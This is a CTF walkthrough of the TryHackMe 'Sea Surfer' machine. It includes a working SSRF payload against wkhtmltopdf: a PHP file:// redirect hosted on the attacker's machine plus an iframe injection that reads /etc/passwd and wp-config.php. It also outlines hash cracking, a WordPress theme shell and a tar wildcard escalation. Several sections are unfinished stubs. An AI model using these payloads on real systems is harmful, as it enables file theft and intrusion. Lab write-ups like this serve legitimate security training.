**---
title: "TryHackMe: Sea Surfer"
date: 05 Jul 2022 @ 0507
excerpt_separator: "<!--more-->"
categories:
  - Walkthrough
tags:
  - Linux
  - Web
  - THM
---
# Summary
Some stuff
# Walkthrough
## Enumeration
### Nmap
Nmap showed only two ports open, SSH on port 22 and HTTP on port 80. 
```bash
Nmap scan report for seasurfer.thm (10.10.143.75)
Host is up, received reset ttl 61 (0.21s latency).
Scanned at 2022-07-06 18:29:08 CDT for 1282s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 3C7EB80E10B984F4C265DB2AB1197E69
|_http-generator: WordPress 5.9.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea Surfer &#8211; Ride the Wave!
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Initial look at the website
Basic Ubuntu landing page

### Checking the HTTP headers with cURL
```bash
curl -I http://$ip
```

The `X-Backend-Server` header gives us a hostname. Add that hostname to the `/etc/hosts` file. 

```bash
HTTP/1.1 200 OK
Date: Wed, 06 Jul 2022 22:51:07 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Sun, 17 Apr 2022 18:54:09 GMT
ETag: "2aa6-5dcde2b3f2ff9"
Accept-Ranges: bytes
Content-Length: 10918
Vary: Accept-Encoding
X-Backend-Server: seasurfer.thm
Content-Type: text/html
```

### Browsing to the website
![](assets/images/Pasted%20image%2020220706175628.png)

Make note of these usernames. 

On the blog, there is a comment on one of the posts

![](assets/images/Pasted%20image%2020220706175834.png)

Notice the spelling..."intrenal". Brandon probably made a typo trying to go to `internal.seasurfer.thm`. We can add that to our `/etc/hosts` file and navigate there. 

### Receipt generator
something

### Details of PDF file
![](assets/images/Pasted%20image%2020220706181037.png
![](assets/images/Pasted%20image%2020220706181114.png)
Here we can see it's using `wkhtmltopdf v.0.12.5` on the backend to create the PDF. 

## Vulnerability research
### SSRF to Local File Read
I found this [website](http://hassankhanyusufzai.com/SSRF-to-LFI/) that details a Server-Side Request Forgery (SSRF) to Local File Read attack against `wkhtmltopdf`. 

### Payload
I created the following file and called it `ssrf.php`. 

```php
<?php header('location:file://'.$_REQUEST['url']); ?>
```

I hosted that file from my attacking machine using a PHP webserver.

>:warning: It's important to use a web server that supports PHP, otherwise the PHP code will not execute. The normal Python3 web server will not work for this exploit. 

To start a PHP web server, execute the following command:

```bash
sudo php -S 0.0.0.0:80
```

We can test the exploit using the following payload in the "Additional Information" field. Other fields work as well, but I used the additional information field. 

```bash
"><iframe height="2000" width="800" src=http://<YOUR THM VPN IP>/ssrf.php?url=%2fetc%2fpasswd></iframe>
```

When I click "Create Receipt", I can read the contents of the `/etc/passwd`. 

![](assets/images/Pasted%20image%2020220706182244.png)

After some trial and error, I found the Wordpress document root was at `/var/www/wordpress`. From there, I was able to grab the `wp-config.php` file. 

![](assets/images/Pasted%20image%2020220706184217.png)

## Exploit
Now that we have the database credentials, we can go back to the `adminer` instance we found earlier during directory fuzzing and try to log in. After logging in and navigating to the `wp_users` table, we find a username and password hash for `kyle`. 

Checking `hashid` shows this hash is a Wordpress hash (Shocker!) and gives us the John the Ripper format (`phpass`). The Hashcat mode is 400. 

![](assets/images/Pasted%20image%2020220706184600.png)

After a minute or two, the hash cracks and we get Kyle's password. We can use this to log into the Wordpress admin panel. 

![](assets/images/Pasted%20image%2020220706190439.png)

Wordpress panel

![](assets/images/Pasted%20image%2020220706191031.png)

Edit the twentyseventeen 404 theme file

![](assets/images/Pasted%20image%2020220706191357.png)

Navigate to a site that isn't there

![](assets/images/Pasted%20image%2020220706191523.png)

Get a shell

![](assets/images/Pasted%20image%2020220706191553.png)

This looks like an interesting file

![](assets/images/Pasted%20image%2020220706192344.png)

Looking at backup.sh

```bash
#!/bin/bash

# Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D
# Still need to come up with a better backup system, perhaps a cloud provider?

cd /var/www/internal/invoices
tar -zcf /home/kyle/backups/invoices.tgz *

```

This script moves into the `/var/www/internal/invoices/` directory and compresses all the contents in that directory into a file named `invoices.tgz` in Kyle's home directory. 

Detail tar wildcard exploit. Get a shell as Kyle

![](assets/images/Pasted%20image%2020220706193431.png)

